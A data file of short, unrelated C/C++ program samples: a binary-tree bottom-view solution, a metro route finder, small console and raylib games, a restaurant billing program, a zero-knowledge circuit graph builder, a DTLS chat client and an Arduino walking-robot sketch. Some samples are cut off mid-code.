    "//https://www.geeksforgeeks.org/problems/bottom-view-of-binary-tree/0\n#include <bits/stdc++.h>\nusing namespace std;\n#define MAX_HEIGHT 100000\n\n// Tree Node\nstruct Node\n{\n    int data;\n    Node* left;\n    Node* right;\n};\n\n// Utility function to create a new Tree Node\nNode* newNode(int val)\n{\n    Node* temp = new Node;\n    temp->data = val;\n    temp->left = NULL;\n    temp->right = NULL;\n\n    return temp;\n}\n\n\nvector <int> bottomView(Node *root);\n\n// Function to Build Tree\nNode* buildTree(string str)\n{\n    // Corner Case\n    if(str.length() == 0 || str[0] == 'N')\n        return NULL;\n\n    // Creating vector of strings from input\n    // string after spliting by space\n    vector<string> ip;\n\n    istringstream iss(str);\n    for(string str; iss >> str; )\n        ip.push_back(str);\n\n    // Create the root of the tree\n    Node* root = newNode(stoi(ip[0]));\n\n    // Push the root to the queue\n    queue<Node*> queue;\n    queue.push(root);\n\n    // Starting from the second element\n    int i = 1;\n    while(!queue.empty() && i < ip.size()) {\n\n        // Get and remove the front of the queue\n        Node* currNode = queue.front();\n        queue.pop();\n\n        // Get the current node's value from the string\n        string currVal = ip[i];\n\n        // If the left child is not null\n        if(currVal != \"N\") {\n\n            // Create the left child for the current node\n            currNode->left = newNode(stoi(currVal));\n\n            // Push it to the queue\n            queue.push(currNode->left);\n        }\n\n        // For the right child\n        i++;\n        if(i >= ip.size())\n            break;\n        currVal = ip[i];\n\n        // If the right child is not null\n        if(currVal != \"N\") {\n\n            // Create the right child for the current node\n            currNode->right = newNode(stoi(currVal));\n\n            // Push it to the queue\n            queue.push(currNode->right);\n        }\n        i++;\n    }\n\n    return root;\n}\n\n\n// } Driver Code Ends\n//Function to return a list containing the bottom view of the given tree.\n\nclass Solution {\n  public:\n    vector <int> bottomView(Node *root) {\n        if(!root) return {} ;\n        map<int , int> nodes ;\n        queue<pair<Node*, int>> q ;\n        q.push({root , 0}) ;\n        while(!q.empty()){\n            auto p = q.front() ;\n            Node * temp = p.first ;\n            int level = p.second ;\n            nodes[level] = temp->data ;\n            q.pop() ;\n            if(temp->left){\n                q.push({temp->left , level -1}) ;\n            }\n            if(temp->right){\n                q.push({temp->right , level +1}) ;\n            }\n        }\n        vector<int> ans ; \n        for(auto it : nodes){\n            ans.push_back(it.second) ;\n        }\n        return ans ;\n    }\n};\n\n\n//{ Driver Code Starts.\n\nint main() {\n    int t;\n    string tc;\n    getline(cin, tc);\n    t=stoi(tc);\n    while(t--)\n    {\n        string s ,ch;\n        getline(cin, s);\n        Node* root = buildTree(s);\n        Solution ob;\n        vector <int> res = ob.bottomView(root);\n        for (int i : res) cout << i << \" \";\n        cout << endl;\n    }\n    return 0;\n}\n",
    "#include <iostream>\n#include <limits.h>\n#include<string>\n#include<math.h>\n#include<cstdlib>\n#include<vector>\n#include<fstream>\n#include<time.h>\n#include<windows.h>\nusing namespace std;\nconst int V=248;\nstruct station_code\n{\n    string name;\n    int code;\n    string color;\n};\nstruct station_code station[V];\nfloat graph[V][V];\n\nstruct node1\n    {\n        vector <float>p;\n    }P[V];\nstring makecapital(string str)\n{\n    for(int i=0;i<str.length();i++)\n    {\n        if(str[i]>96&&str[i]<123)\n            str[i]=str[i]-32;\n    }\n    return str;\n}\nvoid drawbox(int, int, int, int, int);\nvoid secondWindow();\nvoid clrscreen();\nvoid delay(unsigned int ms);\nvoid gotoxy(int x,int y);\nint timetaken(float dist);\nint money(float dist);\nvoid Details(int t);\nvoid Path(float dist,int e,int st,int inter);\nint minDistance(float dist[], bool sptSet[]);\nvoid dijkstra(float graph[V][V], int src,int targ);\nint printSolution(float dist[], int n,int src,int temp);\nvoid take_input();\nvoid logo(int x, int y);\nvoid secondWindow();\nvoid UI();\n\nCOORD coord;\nvoid clrscreen()\n{\n    system(\"cls\");\n    drawbox(1,0,117,29,0);\n}\n\nvoid delay(unsigned int ms)\n{\n    clock_t goal=ms+clock();\n    while(goal>clock());\n}\n\nvoid gotoxy(int x,int y)\n{\n  coord.X=x;\n  coord.Y=y;\n  SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE),coord);\n}\n\nvoid drawbox(int x1, int y1, int x2, int y2, int d)\n{\n    gotoxy(x1,y1);\n    printf(\"+\");\n    delay(d);\n    gotoxy(x2,y2);\n    printf(\"+\");\n    delay(d);\n    int i;\n    for(i=1;i<x2-x1;i++)\n    {   gotoxy(x1+i,y1);\n        printf(\"-\");\n        printf(\"\\a\");\n        delay(d);\n        gotoxy(x2-i,y2);\n        printf(\"-\");\n        delay(d);\n    }\n    gotoxy(x1,y2);\n    printf(\"+\");\n    gotoxy(x2,y1);\n    printf(\"+\");\n    int j;\n    for(j=1;j<y2-y1;j++)\n        {\n            gotoxy(x2,y1+j);\n            printf(\"|\");\n            delay(d);\n            gotoxy(x1,y2-j);\n            printf(\"|\");\n            delay(d);\n        }\n}\n\nint timetaken(float dist)\n{\n    float speed=0.55;\n    return ceil(dist/speed);\n}\n\nint money(float dist)\n{\n    if(dist<=2)\n        return 10;\n    else if(dist>2&&dist<=5)\n        return 20;\n    else if(dist>5&&dist<=12)\n        return 30;\n    else if(dist>12&&dist<=21)\n        return 40;\n    else if(dist>21&&dist<=32)\n        return 50;\n    else\n        return 60;\n}\n\nvoid Details(int t)\n{\n   // cout<<\"\\nthe benchmark location present near \"<<t<<\"is: \"<<details[t].near<<endl;\n}\n\nvoid Path(float d,int e,int st,int inter)\n{\n    int t=e,s;\n    static float dist=0;\n    dist+=d;\n\n    gotoxy(16,11);\n    cout<<\"THE SHORTEST PATH IS : \";\n\n    static int pos_x=12;\n    static int pos_y=15;\n    vector <int> path;\n    path.push_back(t);\n    while(t!=st)\n    {\n        s=P[t].p.size();\n        t=P[t].p[s-1];\n        path.push_back(t);\n    }\n    vector <int>::iterator i=path.end();\n    string str;\n    string color;\n    if(!inter){\n    gotoxy(44,13);\n    cout<<\"****** LOADING ******\";\n    delay(2000);\n    gotoxy(42,13);\n    cout<<\"****** ROUTE FOUND ******\";\n    }\n    vector<int>::iterator i2=path.end();\n    i2--;\n    int n_of_stations=0;\n    while(i!=path.begin())\n    {\n        i--;\n        color=station[*i].color;\n        if(color==\"BLUE\")\n            system(\"color 09\");\n        else if(color==\"YELLOW\")\n            system(\"color 06\");\n        else if(color==\"PINK\")\n            system(\"color 0D\");\n        else if(color==\"RED\")\n            system(\"color 04\");\n        else if(color==\"MAGENTA\")\n            system(\"color 05\");\n        else if(color==\"VOILET\")\n            system(\"color 01\");\n        else if(color==\"GREEN\")\n            system(\"color 02\");\n        else if(color==\"AQUA\")\n            system(\"color 03\");\n        else if(color==\"ORANGE\")\n            system(\"color 0C\");\n\n        if(i!=i2)\n        {\n        if(station[*(i2)].color!=station[*(i)].color)\n        {\n            pos_x=8;\n            pos_y++;\n            gotoxy(pos_x,pos_y);\n            cout<<\"{change from \"<<station[*i2].color<<\" to \"<<station[*i].color<<\"}\";\n            pos_x=12;\n            pos_y++;\n            gotoxy(pos_x,pos_y);\n        }\n        i2--;\n        }\n        str=station[*i].name;\n        if(pos_x+5+str.size()<106)\n        {\n            gotoxy(pos_x,pos_y);\n            cout<<\" ->> \"<<str;\n            pos_x=pos_x+str.size()+5;\n        }\n        else\n        {\n            pos_x=12;\n            pos_y++;\n            gotoxy(pos_x,pos_y);\n            cout<<\" ->> \"<<str;\n            pos_x=pos_x+str.size()+5;\n        }\n        n_of_stations++;\n        delay(700);\n    }\n    if(!inter)\n    {\n      gotoxy(12,++pos_y);\n      cout<<\"INTERMEDIATE STATION\";\n      pos_y++;\n      pos_x=12;\n    }\n\n    if(inter){\n    delay(1000);\n    gotoxy(72,11);\n    cout<<\"PATH LENGTH IS :\";\n    gotoxy(97,11);\n    cout<<d<<\" KM\";\n    delay(1000);\n    gotoxy(16,10);\n    cout<<\"AVERAGE TIME : \";\n    gotoxy(39,10);\n    cout<<timetaken(d)<<\" MIN\";\n    delay(1000);\n    gotoxy(72,10);\n    cout<<\"AVERAGE FARE : \";\n    gotoxy(94,10);\n    cout<<\" Rs. \"<<money(d);\n    delay(",
    "#include <iostream>\r\n#include <cstdlib>\r\n#include <ctime>\r\n\r\nusing namespace std;\r\n\r\nvoid guessNumber() {\r\n    cout << \"Welcome to the Number Guessing Game!\" << endl;\r\n    cout << \"I'm thinking of a number between 1 and 100.\" << endl;\r\n    \r\n    // Generate a random number between 1 and 100\r\n    srand(time(0));\r\n    int secretNumber = rand() % 100 + 1;\r\n    int attempts = 0;\r\n    int guess;\r\n\r\n    while (attempts < 10) {\r\n        cout << \"\\nAttempt: \" << attempts + 1 << endl;\r\n        cout << \"Enter your guess (between 1 and 100): \";\r\n        cin >> guess;\r\n\r\n        if (cin.fail()) {\r\n            cin.clear(); // Clear error flag\r\n            cin.ignore(INT_MAX, '\\n'); // Discard input\r\n            cout << \"Invalid input! Please enter a valid number.\" << endl;\r\n            continue;\r\n        }\r\n\r\n        if (guess < 1 || guess > 100) {\r\n            cout << \"Please enter a number within the range of 1 to 100.\" << endl;\r\n            continue;\r\n        }\r\n\r\n        if (guess < secretNumber) {\r\n            cout << \"Too low! Try a higher number.\" << endl;\r\n        } else if (guess > secretNumber) {\r\n            cout << \"Too high! Try a lower number.\" << endl;\r\n        } else {\r\n            cout << \"Congratulations! You've guessed the number (\" << secretNumber << \") correctly in \" << attempts + 1 << \" attempts!\" << endl;\r\n            return;\r\n        }\r\n        attempts++;\r\n    }\r\n\r\n    cout << \"\\nGame over! The number I was thinking of was \" << secretNumber << \". Better luck next time!\" << endl;\r\n}\r\n\r\nint main() {\r\n    guessNumber();\r\n    return 0;\r\n}\r\n\r\n",
    "#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n#include <conio.h>\r\n#include <windows.h>\r\n#define ENTER 13 //Ascii\r\n#define BKSPC 8\r\n\r\nstruct items\r\n{\r\n    char item[20];\r\n    float price;\r\n    int qty;\r\n};\r\nstruct menus\r\n {\r\n  char item[20];\r\n  int price;\r\n }menu;\r\nstruct orders\r\n{\r\n    char customer[50];\r\n    char date[50];\r\n    int numOfItems;\r\n    struct items itm[50];\r\n};\r\nstruct user\r\n{\r\n    char name[50];\r\n    char username[50];\r\n    char password[50];\r\n    char phone[50];\r\n    char verify[50];\r\n};\r\n\r\nint admin()\r\n{\r\nFILE *tp,*mp,*cp;\r\nint adminc,menuc,choice;\r\nint newp,find=0;\r\nchar irem[20],choicem,cprice[20];\r\n      system(\"cls\");\r\n      fflush(stdin);\r\n   printf(\"\\t\\t\\t\\tPress 1 to Confirm:\\t\");\r\n      fflush(stdin);\r\n      scanf(\"%d\",&adminc);\r\n      system(\"cls\");\r\n        switch(adminc)\r\n         {\r\n         \tflag:\r\n       case 1:\r\n   {\r\n    mathi:\r\n    system(\"cls\");\r\n     printf(\"\\t\\t\\t\\t------MENU SECTION------\");\r\n  printf(\"\\n\\n\\n\\n1.Add item\");\r\n  printf(\"\\n2.Remove item\");\r\n  printf(\"\\n3.Change price\");\r\n  printf(\"\\n4.View current menu\");\r\n  printf(\"\\n5.Go back\");\r\n  printf(\"\\n6.Exit\");\r\n  flag0:\r\n  printf(\"\\nEnter what u wanna do:\\t\");\r\n  fflush(stdin);\r\n  scanf(\"%d\",&menuc);\r\n  switch(menuc)\r\n  {\r\n  case(1)://Add item ko\r\n  {\r\n  flag1:\r\n  system(\"cls\");\r\n  printf(\"Redirecting Please Wait\");\r\n        for (int q=0;q<3;q++)\r\n{\r\n                        Sleep(50);\r\n                        printf(\".\");\r\n                        Sleep(50);\r\n                        printf(\".\");\r\n                        Sleep(50);\r\n                        printf(\".\");\r\n                        Sleep(50);\r\n                        printf(\"\\b \\b\");\r\n                        printf(\"\\b \\b\");\r\n                        printf(\"\\b \\b\");\r\n                    }\r\n                    system(\"cls\");\r\n        printf(\"\\t\\t\\t\\t------MENU------\");\r\n        printf(\"\\n\\n\\n\\n\");\r\ntp=fopen(\"P:\\\\invoice1\\\\menu.txt\",\"a+\");\r\nwhile(fread(&menu,sizeof(menu),1,tp)==1)\r\n           {\r\n               printf(\"+-----------------------------------------------+\\n\");\r\n                            printf(\"|%s\",menu.item);\r\n                            if(strlen(menu.item)>40)\r\n          {\r\n        goto r;\r\n}\r\n       for(int i=strlen(menu.item);i<=40;i++)\r\n        {\r\n        printf(\" \");\r\n}\r\nr:\r\n                              printf(\"Rs_%d\",menu.price);\r\n                            printf(\"\\n+-----------------------------------------------+\");\r\n                              printf(\"\\n\");\r\n           }\r\nfclose(tp);\r\n  struct menus tempmenu;\r\n             tp=fopen(\"P:\\\\invoice1\\\\menu.txt\",\"a+\");\r\n     fflush(stdin);\r\n  printf(\"\\nEnter the name of item:\");\r\n  gets(menu.item);\r\n  while(fread(&tempmenu,sizeof(tempmenu),1,tp)==1)\r\n  {\r\n  if(strcmp(tempmenu.item,menu.item)==0)\r\n  {\r\n  printf(\"The item already exists\\n\");\r\n  printf(\"Press y to change the price: \");\r\n  scanf(\"%c\",&choicem);\r\n  if(choicem=='y'||choicem=='Y')\r\n  {\r\n  \tfclose(tp);\r\n  goto flag3;\r\n}\r\nprintf(\"check the name of item \");\r\ngoto flag1;\r\n}\r\n}\r\n  wrp:\r\n  printf(\"\\nEnter the price of item:\");\r\n  fflush(stdin);\r\n  if(scanf(\"%d\",&menu.price)!=1)\r\n  {\r\n  \tprintf(\"Price must be in number.\\n\");\r\n  \tgoto wrp;\r\n  }\r\n  fwrite(&menu,sizeof(menu),1,tp);\r\n  pricec:\r\n  printf(\"\\nPress 'y' to add more items:\");\r\n  fflush(stdin);\r\n  scanf(\"%c\",&menuc);\r\n  if(menuc=='Y'||menuc=='y')\r\n  {\r\n fclose(tp);\r\n  goto flag1;\r\n  break;\r\n}\r\nelse\r\n{  \r\n   fclose(tp);\r\n   Sleep(1000);\r\ngoto flag;\r\nbreak;\r\n}\r\ngoto mathi;\r\n}\r\ncase(2):\r\n{\r\n      flag2:\r\nsystem(\"cls\");\r\nchoice=0;\r\n      printf(\"Redirecting Please Wait\");\r\n        for (int q=0;q<3;q++)\r\n{\r\n                        Sleep(50);\r\n                        printf(\".\");\r\n                        Sleep(50);\r\n                        printf(\".\");\r\n                        Sleep(50);\r\n                        printf(\".\");\r\n                        Sleep(50);\r\n                        printf(\"\\b \\b\");\r\n                        printf(\"\\b \\b\");\r\n                        printf(\"\\b \\b\");\r\n                    }\r\n                    system(\"cls\");\r\nfind=0;\r\nsystem(\"cls\");\r\n        printf(\"\\t\\t\\t\\t------MENU------\");\r\n        printf(\"\\n\\n\\n\\n\");\r\ntp=fopen(\"P:\\\\invoice1\\\\menu.txt\",\"r\");\r\nwhile(fread(&menu,sizeof(menu),1,tp)==1)\r\n           {\r\n               printf(\"+-----------------------------------------------+\\n\");\r\n                            printf(\"|%s\",menu.item);\r\n                            if(strlen(menu.item)>40)\r\n           {\r\n        goto s;\r\n}\r\n       for(int i=strlen(menu.item);i<=40;i++)\r\n        {\r\n        printf(\" \");\r\n}\r\ns:\r\n                              printf(\"Rs_%d\",menu.price);\r\n                            printf(\"\\n+-----------------------------------------------+\");\r\n                              printf(\"\\n\");\r\n           }\r\nfclose(tp);\r\ntp=fopen(\"P:\\\\invoice1\\\\menu.txt\",\"r\");\r\n printf(\"\\nEnter the name of item you want to remove:\\t\");\r\n fflush(stdin);\r\n scanf(\"%s\",irem);\r\n mp=fopen(\"P:\\\\invoice\\\\tempmenu.txt\",\"w\");\r\n  //rewind(tp);\r\n  //rewin",
    "#include <cstddef>\n#include <cstdio>\n#include <vector>\n\n// Parsers\n#include <wtk/Parser.h>                // top level API\n#include <wtk/circuit/Parser.h>        // circuit IR API\n#include <wtk/circuit/Data.h>          // structs used by the circuit parser API\n#include <wtk/irregular/Parser.h>      // text parser implementation\n\n#include <wtk/utils/ParserOrganizer.h> // \"owner\"/\"organizer\" for parsers\n\n// Backend API\n#include <wtk/TypeBackend.h>           // per-field/type backend callback API\n#include <wtk/Converter.h>             // field switching API\n\n// NAILS Interpreter\n#include <wtk/nails/Interpreter.h>     // main actor of the NAILS API\n#include <wtk/nails/Handler.h>         // bridge between NAILS and the Parser\n#include <wtk/nails/Functions.h>       // helpers for NAILS functions\n\n// Plugin API\n#include <wtk/plugins/Plugin.h>        // The general Plugin API\n#include <wtk/plugins/Multiplexer.h>   // Specific to each feature...\n#include <wtk/plugins/ArithmeticRAM.h>\n#include <wtk/plugins/Vectors.h>       // WizToolKit bonus plugin\n#include <wtk/nails/IterPlugin.h>\n\n// An unbounded (or big enough not to overflow) numeric type.\n#include <gmpxx.h>\nusing ValueType = mpz_class;\n// using ValueType = uint64_t; \n\n#include <wtk/utils/NumUtils.gmp.h> // GMP specific hacks\n#include <iostream>\n\n#include \"bindings.h\"\n\nstd::vector<WireType> outputs;\nstd::vector<Gate> graph;\n\nstd::vector<ValueType> primes;\nstd::vector<ValueType> privateStream;\nstd::vector<ValueType> publicStream;\nstd::vector<const char*> plugins;\n\n//int nmuls = 0;\n//int ncmuls = 0;\n//int ngates = 0;\n\nconst WireType*\ngetOutputs(uint64_t* const nrOutputs)\n{\n  *nrOutputs = outputs.size();\n  return &outputs[0];\n}\n\nconst ValueType*\ngetPrivateInputs(uint64_t* const nrPrivateInputs)\n{\n  *nrPrivateInputs = privateStream.size();\n  return &privateStream[0];\n}\n\nconst ValueType*\ngetPublicInputs(uint64_t* const nrPublicInputs)\n{\n  *nrPublicInputs = publicStream.size();\n  return &publicStream[0];\n}\n\nconst ValueType*\ngetPrimes(uint64_t* const nrPrimes)\n{\n  *nrPrimes = primes.size();\n  return &primes[0];\n}\n\nGate const*\ngetDriver(WireType const output)\n{\n  return &graph[output];\n}\n\nGate const*\ngetGates(uint64_t* const nrGates)\n{\n  *nrGates = graph.size();\n  return &graph[0];\n}\n\nconst char** getPlugins(uint64_t* const nrPlugins) {\n  *nrPlugins = plugins.size();\n  return &plugins[0];\n}\n\n// Struct containing the data carried between gates (\"wires\")\n\n// Backend implementation of callbacks\nstruct GraphBuilder : wtk::TypeBackend<ValueType, WireType>\n{\n  bool assertFailure = false;\n\n  // TypeSpec is a wrapper for the IR's types (field/ring/...)\n  GraphBuilder(wtk::circuit::TypeSpec<ValueType> const* t)\n    : wtk::TypeBackend<ValueType, WireType>(t) { }\n\n  // $0 <- <0>;\n  void assign(WireType* output, ValueType&& input_value) override\n  {\n    *output = graph.size();\n    //printf(\"C: assign gate(%llu)\\n\", *element);\n    graph.push_back({GateType::assign, *output, 0});\n    mpz_set(graph.back().value, input_value.get_mpz_t());\n    //ngates = ngates + 1;\n  }\n\n  // $1 <- $0;\n  void copy(WireType* output, WireType const* input_wire) override\n  {\n    *output = graph.size();\n    //printf(\"C: copy gate(%llu)\\n\", *output);\n    graph.push_back({GateType::copy, *output, *input_wire, 0});\n  }\n\n  // $2 <- @add($0, $1);\n  void addGate(WireType* output,\n      WireType const* left_input, WireType const* right_input) override\n  {\n    *output = graph.size();\n    //printf(\"C: add gate(%llu, %llu, %llu)\\n\", *out, *left, *right);\n    graph.push_back({GateType::add, *output, *left_input, *right_input});\n    //ngates = ngates + 1;\n  }\n\n  // $3 <- @add($1, $2);\n  void mulGate(WireType* output,\n      WireType const* left_input, WireType const* right_input) override\n  {\n    *output = graph.size();\n    //printf(\"C: mul gate(%llu, %llu, %llu)\\n\", *out, *left, *right);\n    graph.push_back({GateType::mul, *output, *left_input, *right_input});\n    //nmuls = nmuls + 1;\n    //ngates = ngates + 1;\n  }\n\n  // $4 <- @addc($3, <1>);\n  void addcGate(WireType* output,\n      WireType const* left_input, ValueType&& right_input) override\n  {\n    *output = graph.size();\n    //printf(\"C: addc gate(%llu)\\n\", *out);\n    graph.push_back({GateType::addc, *output, *left_input});\n    mpz_set(graph.back().value, right_input.get_mpz_t());\n    //ncmuls = ncmuls + 1;\n    //ngates = ngates + 1;\n  }\n\n  // $4 <- @addc($3, <2>);\n  void mulcGate(WireType* output,\n      WireType const* left_input, ValueType&& right_input) override\n  {\n    *output = graph.size();\n    //printf(\"C: mulc gate(%llu)\\n\", *out);\n    graph.push_back({GateType::mulc, *output, *left_input});\n    mpz_set(graph.back().value, right_input.get_mpz_t());\n    //ngates = ngates + 1;\n  }\n\n  // @assert_zero($4);\n  // Failures may occur, but should get cached until the end when \"check()\"\n  // is called\n  void assertZero(WireType const* input_wire) override\n  {\n    graph.push_back({GateType::assertZero, 0, *input_wire, 0});\n    outputs.push_back(*input_wire);\n  }\n\n  // ",
    "#include <iostream>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <cstring>\n#include <unistd.h>\n#include <openssl/ssl.h>\n#include <openssl/err.h>\n#include <arpa/inet.h>\n#include <netdb.h>\n\nusing namespace std;\n\n\n// All ips names for references\n// 172.31.0.3 Bob\n// 172.31.0.2 Alice\n// 172.31.0.4 Trudy\n\n\n\n#define BUFFER_SIZE 2048\n\n// defining server port \n#define SERVER_PORT 12345\n\n// global serverIP, we are also using gethost by name and updating it in main function, it also have global server address variables\nchar *SERVER_IP = \"172.31.0.3\";\nint serverSocket;\nstruct sockaddr_in serverAddr;\n\n\n// Define paths to the private keys and certificates for Alice and Bob and combined certificate of root and intermediate\nconst char *ALICE_CERT_PATH = \"alice.crt\";\nconst char *ALICE_KEY_PATH = \"alice_private_key.pem\";\n\nconst char *BOB_CERT_PATH = \"bob.crt\";\nconst char *BOB_KEY_PATH = \"bob_private_key.pem\";\n\nconst char *COMBINED_CERT_PATH = \"combined.crt\";\n\n\n// Client class \nclass Client\n{\nprivate:\n    string server_name;\n\npublic:\n    Client(string server_name) : server_name(server_name) {}\n\n    // client making connection to server\n    int setting_up_udp_sock_for_conn()\n    {\n        int clientSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);\n\n        if (clientSocket == -1)\n        {\n            perror(\"....Socket creation failed....\");\n            return -1;\n        }\n\n        // struct sockaddr_in serverAddr;\n        serverAddr.sin_family = AF_INET;\n        serverAddr.sin_port = htons(SERVER_PORT);\n        serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP);\n\n        cout << \"Connected with IP address: \" << inet_ntoa(serverAddr.sin_addr) << endl;\n\n        return clientSocket;\n    }\n\n    \n    void dtls_client(int clientSocket)\n    {\n\n        // Initialize OpenSSL library functions\n        SSL_library_init();\n        SSL_load_error_strings();\n        OpenSSL_add_ssl_algorithms();\n\n        // Create SSL context for storing config. info. about the SSL connections\n        SSL_CTX *ctx = SSL_CTX_new(DTLSv1_2_client_method());\n        SSL_CTX_set_security_level(ctx, 1);\n        if (!ctx)\n        {\n            perror(\"....Failed to create SSL context....\");\n            return;\n        }\n\n        // Create a SSL object\n        SSL *ssl = SSL_new(ctx);\n\n        if (!ssl)\n        {\n            perror(\"....Failed to create SSL object....\");\n            SSL_CTX_free(ctx);\n            return;\n        }\n\n        // Load Alice's certificate\n        if (SSL_CTX_use_certificate_file(ctx, ALICE_CERT_PATH, SSL_FILETYPE_PEM) <= 0)\n        {\n            perror(\"Failed to load Alice's certificate file\");\n            SSL_CTX_free(ctx);\n            return;\n        }\n\n        // Load Alice's private key\n        if (SSL_CTX_use_PrivateKey_file(ctx, ALICE_KEY_PATH, SSL_FILETYPE_PEM) <= 0)\n        {\n            perror(\"Failed to load Alice's private key file\");\n            SSL_CTX_free(ctx);\n            return;\n        }\n\n        // Connect to server socket\n        socklen_t serverLen = sizeof(serverAddr);\n\n        if (connect(clientSocket, (struct sockaddr *)&serverAddr, serverLen) < 0)\n        {\n            perror(\"....Invalid address/ Address not supported....\");\n            SSL_CTX_free(ctx);\n            return;\n        }\n\n        // Set the cipher suites for perfect forward secrecy (PFS) at client side\n        const char *cipher_list = \"ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384\";\n        if (SSL_CTX_set_cipher_list(ctx, cipher_list) != 1)\n        {\n            cerr << \"Failed to set cipher list\" << endl;\n            SSL_CTX_free(ctx);\n            return;\n        }\n\n        // Exchange application layer control messages\n        char msg_from_server[BUFFER_SIZE];\n        char msg_to_send[BUFFER_SIZE];\n        const char *chat_hello = \"chat_hello\";\n        const char *chat_ok_reply = \"chat_ok_reply\";\n\n        // Send chat_hello message\n        struct timeval timeout;\n        timeout.tv_sec = 1; // 1 seconds timeout we can change it according to need.\n        timeout.tv_usec = 0;\n        if (setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout)) < 0)\n        {\n            std::cerr << \"Error setting socket options: \" << strerror(errno) << std::endl;\n            close(clientSocket);\n            return;\n        }\n\n        char buffer[BUFFER_SIZE];\n        int reply;\n\n        // Reliability Implemeted for chat_hello\n\n        while (true)\n        {\n\n            if (sendto(clientSocket, chat_hello, strlen(chat_hello), 0, (struct sockaddr *)&serverAddr, serverLen) < 0)\n            {\n                cerr << \"Error sending message to server...\" << endl;\n                SSL_CTX_free(ctx);\n                return;\n            }\n\n            // Wait for chat_ok_reply from server to close application control messages\n            reply = ",
    "// This program is only to mark up the procedure of walking-motion of a robot, so it's not procedurally active.\n#include <Servo.h>\n\n// Define servo objects\nServo hipLeft;\nServo kneeLeft;\nServo ankleLeft;\nServo hipRight;\nServo kneeRight;\nServo ankleRight;\n\n// Define initial positions\nint hipLeftPos = 90;\nint kneeLeftPos = 90;\nint ankleLeftPos = 90;\nint hipRightPos = 90;\nint kneeRightPos = 90;\nint ankleRightPos = 90;\n\nvoid setup() {\n  // Attach servos to corresponding pins\n  hipLeft.attach(2);\n  kneeLeft.attach(3);\n  ankleLeft.attach(4);\n  hipRight.attach(5);\n  kneeRight.attach(6);\n  ankleRight.attach(7);\n\n  // Initialize servos to starting positions\n  hipLeft.write(hipLeftPos);\n  kneeLeft.write(kneeLeftPos);\n  ankleLeft.write(ankleLeftPos);\n  hipRight.write(hipRightPos);\n  kneeRight.write(kneeRightPos);\n  ankleRight.write(ankleRightPos);\n}\n\nvoid loop() {\n  // Shift weight to right leg\n  shiftWeightRight();\n  delay(1000);\n\n  // Lift left leg\n  liftLeftLeg();\n  delay(1000);\n\n  // Move left leg forward\n  moveLeftLegForward();\n  delay(1000);\n\n  // Place left leg down\n  placeLeftLegDown();\n  delay(1000);\n\n  // Shift weight to left leg\n  shiftWeightLeft();\n  delay(1000);\n\n  // Lift right leg\n  liftRightLeg();\n  delay(1000);\n\n  // Move right leg forward\n  moveRightLegForward();\n  delay(1000);\n\n  // Place right leg down\n  placeRightLegDown();\n  delay(1000);\n}\n",
    "#include \"include/raylib.h\"\n#include <iostream>\n\nint main()\n{\n  // window dimensions\n  int width{800};\n  int height{450};\n  InitWindow(width, height, \"Axe Game\");\n  // circle coords\n  int circle_x{200};\n  int circle_y{200};\n  int circle_radius{25};\n  Color circle_color{BLUE};\n  // axe properties\n  int axe_x{width / 2};\n  int axe_y{circle_y / 2};\n  int axe_length{50};\n  Color axe_color{RED};\n  int axe_movement{10};\n  // circle edges\n  int l_circle_x{circle_x - circle_radius};\n  int r_circle_x{circle_x + circle_radius};\n  int u_circle_y{circle_y - circle_radius};\n  int b_circle_y{circle_y + circle_radius};\n  // axe edges\n  int l_axe_x{axe_x};\n  int r_axe_x{axe_x + axe_length};\n  int u_axe_y{axe_y};\n  int b_axe_y{axe_y + axe_length};\n  // collision\n  bool hasCollided = ((b_axe_y >= u_circle_y) && (u_axe_y <= b_circle_y) && (r_axe_x >= l_circle_x) && (l_axe_x <= r_circle_x));\n  SetTargetFPS(60);\n  // game loop\n  while (true)\n  {\n    BeginDrawing();\n    ClearBackground(WHITE);\n    if (hasCollided)\n    {\n      DrawText(\"Game Over\", circle_x, circle_y, 20, RED);\n    }\n    else\n    {\n      // game logic begins\n\n      // circle edges\n      l_circle_x = circle_x - circle_radius;\n      r_circle_x = circle_x + circle_radius;\n      u_circle_y = circle_y - circle_radius;\n      b_circle_y = circle_y + circle_radius;\n\n      // axe edges\n      l_axe_x = axe_x;\n      r_axe_x = axe_x + axe_length;\n      u_axe_y = axe_y;\n      b_axe_y = axe_y + axe_length;\n\n      hasCollided = ((b_axe_y >= u_circle_y) && (u_axe_y <= b_circle_y) && (r_axe_x >= l_circle_x) && (l_axe_x <= r_circle_x));\n\n      DrawCircle(circle_x, circle_y, circle_radius, circle_color);\n      DrawRectangle(axe_x, axe_y, axe_length, axe_length, axe_color);\n\n      // Move the axe\n      axe_y += axe_movement;\n      if (axe_y > (height - axe_length) || axe_y < 0)\n      {\n        axe_movement = -axe_movement;\n      }\n\n      if (IsKeyDown(KEY_A) && circle_x > 0)\n      {\n        circle_x -= 10;\n      }\n      if (IsKeyDown(KEY_D) && circle_x < width)\n      {\n        circle_x += 10;\n      }\n    }\n    // game logic ends\n    EndDrawing();\n  }\n}\n",
